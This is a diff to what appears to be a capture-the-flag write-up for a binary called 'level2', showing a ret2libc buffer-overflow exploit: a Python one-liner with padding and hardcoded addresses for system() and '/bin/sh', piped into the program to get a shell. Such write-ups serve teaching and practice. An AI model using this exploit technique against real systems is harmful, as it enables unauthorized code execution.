@@ -67,7 +67,7 @@ system("/bin/sh") : ret                 + system              + "...." + "/bin/s
 
 ```shell
 python2.7 -c 'print("X"*80 + "\x4b\x85\x04\x08"  + "\x60\xb0\xe6\xb7"  + "...." + "\x58\xcc\xf8\xb7")' > /tmp/exploit.txt
-cat /tmp/exploit.txt /dev/stdin | ./level2
+cat /tmp/exploit.txt - | ./level2
 ```
 
 ## flag
